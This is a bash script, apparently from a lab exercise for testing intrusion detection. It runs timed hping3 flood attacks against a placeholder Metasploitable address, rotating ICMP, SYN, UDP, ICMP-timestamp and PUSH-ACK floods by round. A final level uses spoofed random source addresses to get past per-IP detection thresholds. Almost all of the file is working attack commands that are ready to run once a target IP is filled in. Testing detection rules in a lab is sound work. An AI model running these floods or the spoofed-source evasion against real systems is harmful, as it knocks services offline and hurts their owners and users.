#!/bin/bash

# =================================================================
# SCENARIO 03: DENIAL OF SERVICE (DoS) - PAYLOAD ROTATION
# Strategy: 3 Level Depth (Volumetric, Protocol, Randomized)
# Input: Receives argument $1 as the Round Number
# =================================================================

# Receive Input Round Number from Daily Round
ROUND=${1:-1} # Default to round 1 if empty

# CONFIGURATION
TARGET_IP="192.168.x.x"   # Replace with your Metasploitable IP
LOG_FILE="logs/dos_session_$(date +%F).log"

# Colors for Report Display
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# =================================================================
# PAYLOAD ROTATION LOGIC (PAYLOAD DIVERSITY)
# Changes the protocol and target port based on the round phase
# =================================================================
if [ "$ROUND" -le 10 ]; then
    # --- SET A (Round 1-10) ---
    # Level 1: ICMP Flood (Ping Flood Standard)
    OPT_L1="-1"
    DESC_L1="ICMP Flood (Smurf/Ping)"
    
    # Level 2: SYN Flood to Port 80 (HTTP)
    OPT_L2="-S -p 80"
    DESC_L2="SYN Flood (Port 80/HTTP)"

elif [ "$ROUND" -le 20 ]; then
    # --- SET B (Round 11-20) ---
    # Level 1: UDP Flood to Port 53 (DNS)
    OPT_L1="-2 -p 53"
    DESC_L1="UDP Flood (Port 53/DNS)"
    
    # Level 2: SYN Flood to Port 21 (FTP) - Replace target service
    OPT_L2="-S -p 21"
    DESC_L2="SYN Flood (Port 21/FTP)"

else
    # --- SET C (Round 21-30) ---
    # Level 1: ICMP Timestamp Flood (Type 13)
    OPT_L1="--icmp-ts"
    DESC_L1="ICMP Timestamp Flood"
    
    # Level 2: PUSH-ACK Flood (TCP State Confusion)
    OPT_L2="-PA -p 80"
    DESC_L2="PUSH-ACK Flood (Port 80)"
fi

echo "[+] [03_DOS] Starting Denial of Service Scenario..."
echo "[+] Target: $TARGET_IP"
echo "[+] Mode: Round $ROUND ($DESC_L1 & $DESC_L2)"
echo "[+] Start Time: $(date)"

# -----------------------------------------------------------------
# LEVEL 1: VOLUMETRIC FLOOD (BANDWIDTH)
# Goal: Test detection of volumetric attacks on different protocols.
# Technique: Send packets as fast as possible (--flood).
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 1] Running $DESC_L1 (30 seconds)...${NC}"

# Record the initial timestamp
echo "Start Flood: $(date)" > logs/dos_lvl1_r${ROUND}.txt

# Store command (using variable $OPT_L1)
CMD="timeout 30 hping3 $OPT_L1 --flood $TARGET_IP"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
$CMD >> logs/dos_lvl1_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: GPL Large Packet / Stream anomaly alert)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 2: PROTOCOL FLOOD (TCP STATE EXHAUSTION)
# Goal: Consume the target's CPU/RAM resources (service stress).
# Technique: Use flags and a specific port from variable $OPT_L2.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 2] Running $DESC_L2 (30 seconds)...${NC}"

echo "Start Protocol Flood: $(date)" > logs/dos_lvl2_r${ROUND}.txt

# Store command (using variable $OPT_L2)
CMD="timeout 30 hping3 $OPT_L2 --flood $TARGET_IP"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
$CMD >> logs/dos_lvl2_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: ET DOS Potential Flood alert)"
sleep 10

# -----------------------------------------------------------------
# LEVEL 3: RANDOM SOURCE ATTACK (DDoS SIMULATION)
# Goal: Bypass the rule for "threshold per IP".
# Technique: Use random fake IPs (--rand-source) with the L2 vector.
# -----------------------------------------------------------------
echo -e "${CYAN}[Level 3] Running Random Source DDoS (--rand-source)...${NC}"

echo "Start DDoS Sim: $(date)" > logs/dos_lvl3_r${ROUND}.txt

# Store command (combining L2 vector + random source)
CMD="timeout 30 hping3 $OPT_L2 --flood --rand-source $TARGET_IP"

# Display the command on screen
echo -e "${YELLOW}    [COMMAND] $CMD${NC}"

# Execute the command
$CMD >> logs/dos_lvl3_r${ROUND}.txt 2>&1
echo "    -> Completed. (Expected: test IDS global threshold)"

echo "[+] [03_DOS] Module Finished at $(date)"
echo "-----------------------------------------------------------"